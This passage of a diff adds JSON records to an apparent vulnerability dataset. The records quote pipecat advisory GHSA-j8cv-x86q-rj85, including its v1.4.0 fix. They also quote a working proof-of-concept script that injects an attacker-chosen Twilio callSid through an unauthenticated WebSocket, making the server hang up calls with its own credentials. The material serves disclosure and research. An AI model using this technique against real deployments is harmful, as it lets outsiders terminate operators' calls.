{FAKE_AUTH_TOKEN[:8]!r}...   [from TWILIO_AUTH_TOKEN env var]\")\n\n    # This is the exact code at utils.py:513-517.\n    serializer = TwilioFrameSerializer(\n        stream_sid=stream_id,\n        call_sid=call_id,             # TAINTED \u2014 attacker-supplied\n        account_sid=FAKE_ACCOUNT_SID, # server credential\n        auth_token=FAKE_AUTH_TOKEN,   # server credential\n    )\n\n    print()\n    print(\"=\" * 65)\n    print(\"Step 4 \u2014 Pipeline ends: serialize(EndFrame()) triggers _hang_up_call()\")\n    print(\"         (twilio.py:141-147 -> twilio.py:196, :206)\")\n    print(\"=\" * 65)\n    print(\"Calling serializer.serialize(EndFrame()) ...\")\n    print(f\"Expected Twilio API URL:\")\n    print(f\"  https://api.twilio.com/2010-04-01/Accounts/{FAKE_ACCOUNT_SID}\"\n          f\"/Calls/{call_id}.json\")\n    print(\"(api.twilio.com resolves to 127.0.0.1 \u2014 intercepted by mock server)\")\n\n    # This line reproduces twilio.py:141-147 -> _hang_up_call().\n    # aiohttp will POST to api.twilio.com which /etc/hosts redirects to\n    # our mock HTTPS server.  The mock server logs the request including\n    # the attacker-injected callSid in the URL.\n    await serializer.serialize(EndFrame())\n\n    print(\"serialize(EndFrame()) returned \u2014 API POST dispatched.\")",
+          "text_sha256": "11bce66ec202fd9e5fad0bf1d33ab64731b9b81cfd4b81c2ca33da11f4a94665"
+        },
+        {
+          "heading": "---------------------------------------------------------------------------",
+          "metadata": {
+            "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+            "snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+            "source_root": "GHSA-j8cv-x86q-rj85"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 1,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [
+              "websocket_url"
+            ],
+            "override": [],
+            "surface": [
+              "websocket"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "async def main() -> bool:\n    print()\n    print(\"=\" * 65)\n    print(\"VULN-001 PoC \u2014 Telephony WebSocket callSid Injection\")\n    print(\"CWE-862: Missing Authorization\")\n    print(\"pipecat-ai/pipecat @ commit b982b45\")\n    print(\"=\" * 65)\n\n    # 1. Redirect api.twilio.com to localhost\n    ensure_hosts_redirect()\n\n    # 2. Start the mock Twilio HTTPS server\n    print(\"[*] Starting mock Twilio REST API server on 127.0.0.1:443 ...\")\n    start_mock_twilio_server()\n    time.sleep(0.3)  # Let the server thread bind and start accepting.\n    print(\"[+] Mock server ready.\")\n\n    # 3. Reproduce the attack using pipecat's own code\n    try:\n        await reproduce_attack()\n    except Exception as exc:\n        print(f\"\\n[ERROR] Attack reproduction raised an exception: {exc}\")\n        import traceback\n        traceback.print_exc()\n        return False\n\n    # 4. Wait for the mock server to record the intercepted request\n    print()\n    print(\"[*] Waiting for mock Twilio server to receive POST request (timeout 10 s) ...\")\n    received = _request_received.wait(timeout=10.0)\n\n    # 5. Evaluate evidence\n    print()\n    print(\"=\" * 65)\n    print(\"EVIDENCE EVALUATION\")\n    print(\"=\" * 65)\n\n    if not received or not _intercepted_requests:\n        print(\"[FAIL] Mock Twilio server received no requests within 10 seconds.\")\n        print(\"       Likely causes:\")\n        print(\"       - api.twilio.com /etc/hosts entry missing or wrong\")\n        print(\"       - Port 443 could not be bound (need root)\")\n        print(\"       - CA certificate not added to system trust store\")\n        return False\n\n    req = _intercepted_requests[0]\n    path = req[\"path\"]\n    auth = req[\"authorization\"]\n    body = req[\"body\"]\n\n    print(f\"Intercepted POST:\")\n    print(f\"  URL:           https://api.twilio.com{path}\")\n    print(f\"  Authorization: {auth}\")\n    print(f\"  Body:          {body}\")\n\n    expected_fragment = f\"/Calls/{ATTACKER_CALL_SID}.json\"\n    if expected_fragment in path:\n        print()\n        print(\"[PASS] *** VULNERABILITY CONFIRMED ***\")\n        print(f\"[PASS] Attacker callSid '{ATTACKER_CALL_SID}' appears in Twilio REST API URL.\")\n        print(f\"[PASS] The server used its own credentials (account_sid={FAKE_ACCOUNT_SID})\")\n        print(f\"[PASS] to issue an authenticated hang-up command for the attacker-specified call SID.\")\n        print(f\"[PASS] In a real deployment this terminates the call if the SID identifies an active call\")\n        print(f\"[PASS] in the server operator's Twilio account.\")\n        return True\n    else:\n        print()\n        print(f\"[FAIL] Expected callSid not found in intercepted path: {path}\")\n        return False\n\n\nif __name__ == \"__main__\":\n    success = asyncio.run(main())\n    sys.exit(0 if success else 1)\n```",
+          "text_sha256": "925e32faa4d9df83d5f38c3e78a982533553c313b1a6bba3d0fded4fea7142b1"
+        },
+        {
+          "heading": "Resolution",
+          "metadata": {
+            "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+            "snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+            "source_root": "GHSA-j8cv-x86q-rj85"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "websocket"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "This issue was addressed in pipecat-ai `v1.4.0` by adding optional HMAC token authentication for development-runner WebSocket endpoints.\n\nOperators who expose the development runner\u2019s WebSocket endpoints to anything other than localhost should upgrade to `v1.4.0` or later and enable WebSocket token authentication:\n\n```bash\nPIPECAT_WEBSOCKET_AUTH=token\n```\n\nor:\n\n```bash\npython bot.py -t twilio --ws-auth token\npython bot.py -t websocket --ws-auth token\n```\n\nWhen enabled, clients must first call `POST /start` to obtain a short-lived, one-time-use signed token before connecting to `/ws` or `/ws-client`. Tokens may be supplied via\n`Authorization: Bearer <token>`, `?token=<token>`, or as a path segment such as `/ws/<token>`, which is intended for telephony providers that cannot set custom headers. Invalid,\nexpired, or replayed tokens are rejected with WebSocket close code `4003`.\n\nThe fix was merged in https://github.com/pipecat-ai/pipecat/pull/4660.",
+          "text_sha256": "eda66c219a412b2bc076424b9eb664e79a47e5c87fdec03801a5e48e846c0bb5"
+        }
+      ],
+      "scoring_executed": false,
+      "source_project": "pipecat-ai/pipecat",
+      "source_replacement_used": false,
+      "source_root": "GHSA-j8cv-x86q-rj85",
+      "source_snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+      "standards_rubric": {
+        "counts_as_target_evidence": false,
+        "cwe_ids": [
+          "CWE-862",
+          "CWE-863"
+        ],
+        "owasp_ids": [
+          "A01:2025"
+        ],
+        "principle": "WebSocket channels are only surfaces; promotion requires an observed subscription/message authorization failure.",
+        "wstg_ids": [
+          "WSTG-CLNT-10",
+          "WSTG-ATHZ-02"
+        ]
+      },
+      "target_contact_performed": false,
+      "third_party_code_executed": false,
+      "unclassified_record_count": 2,
+      "vulnerable_condition_record_count": 2,
+      "vulnerable_identity_or_surface_record_count": 8,
+      "vulnerable_state_record_count": 8,
+      "writeup_rubric_sha256": "38086b6287f3f92724a02235e29e3afcd636c7876a22255a62eaf33f8636b35a",
+      "writeups_count_as_target_evidence": false
+    }
+  ],
+  "families_with_exact_revision_pairs_used": 6,
+  "families_with_vulnerable_condition_records": 6,
+  "families_with_vulnerable_identity_or_surface_records": 7,
+  "family_count": 11,
+  "first_blind_consumed": false,
+  "historical_exact_pair_identity_mismatch_count": 1,
+  "historical_exact_pair_identity_mismatch_families": [
+    "information_disclosure"
+  ],
+  "human_adjudication_performed": false,
+  "human_review_required": false,
+  "record_count": 77,
+  "role_counts": {
+    "fixed_or_remediation_state": 28,
+    "fixed_test_control_state": 4,
+    "unclassified_source_state": 6,
+    "vulnerable_or_impact_state": 24,
+    "vulnerable_parent_state": 15
+  },
+  "role_pack_sha256": "820650df0c61f23754367c8e304b7c603988df2bc447bb7a6954b8fc0570e7fe",
+  "rule_version": "2026.08.15.6.33.v7.unseen.priority0-role-pack.2",
+  "scoring_executed": false,
+  "source_assignment_commit": "5656a8add583f61e712a837794ce7302857fce7a",
+  "source_assignment_locked": true,
+  "source_replacement_allowed": false,
+  "source_replacement_used": false,
+  "standards_count_as_target_evidence": false,
+  "target_contact_performed": false,
+  "third_party_code_executed": false,
+  "version": "1.0.1",
+  "writeups_count_as_target_evidence": false
+}
